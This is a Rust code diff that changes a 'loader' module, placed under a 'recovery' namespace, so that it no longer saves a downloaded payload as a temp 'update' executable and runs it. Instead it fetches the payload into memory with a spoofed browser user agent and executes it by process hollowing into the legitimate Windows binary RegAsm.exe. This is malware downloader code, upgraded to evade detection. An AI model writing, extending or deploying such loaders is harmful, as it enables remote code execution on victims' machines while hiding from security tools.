@@ -1,10 +1,6 @@
+use crate::recovery::hollowing;
 use crate::recovery::settings::RecoveryControl;
-use std::env;
-use std::path::PathBuf;
-use std::process::Command;
-use tokio::fs;
-use tokio::io::AsyncWriteExt;
-use tracing::{debug, error, info};
+use tracing::{error, info};
 
 pub async fn run_loader() {
     let control = RecoveryControl::global();
@@ -16,17 +12,15 @@ pub async fn run_loader() {
         return;
     }
 
-    info!(url = %url, "starting loader task");
+    info!(url = %url, "starting memory-based loader task");
 
-    let temp_dir = env::temp_dir();
-    let file_name = format!("update-{}.exe", uuid::Uuid::new_v4());
-    let dest_path = temp_dir.join(file_name);
-
-    match download_payload(url, &dest_path).await {
-        Ok(_) => {
-            info!(path = %dest_path.display(), "payload downloaded successfully");
-            match execute_payload(&dest_path) {
-                Ok(_) => info!("payload executed"),
+    match download_payload(url).await {
+        Ok(bytes) => {
+            info!("payload downloaded to memory ({} bytes)", bytes.len());
+            // Target a legitimate Microsoft binary for hollowing
+            let target = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe";
+            match execute_payload(&bytes, target) {
+                Ok(_) => info!("payload executed via process hollowing into {}", target),
                 Err(e) => error!(error = %e, "failed to execute payload"),
             }
         }
@@ -34,7 +28,7 @@ pub async fn run_loader() {
     }
 }
 
-async fn download_payload(url: &str, dest: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
+async fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let client = reqwest::Client::builder()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
         .build()?;
@@ -45,15 +39,9 @@ async fn download_payload(url: &str, dest: &PathBuf) -> Result<(), Box<dyn std::
     }
 
     let bytes = response.bytes().await?;
-    let mut file = fs::File::create(dest).await?;
-    file.write_all(&bytes).await?;
-    
-    Ok(())
+    Ok(bytes.to_vec())
 }
 
-fn execute_payload(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
-    // Start detached
-    Command::new(path)
-        .spawn()?;
-    Ok(())
+fn execute_payload(bytes: &[u8], target: &str) -> Result<(), Box<dyn std::error::Error>> {
+    hollowing::run_pe(bytes, target)
 }
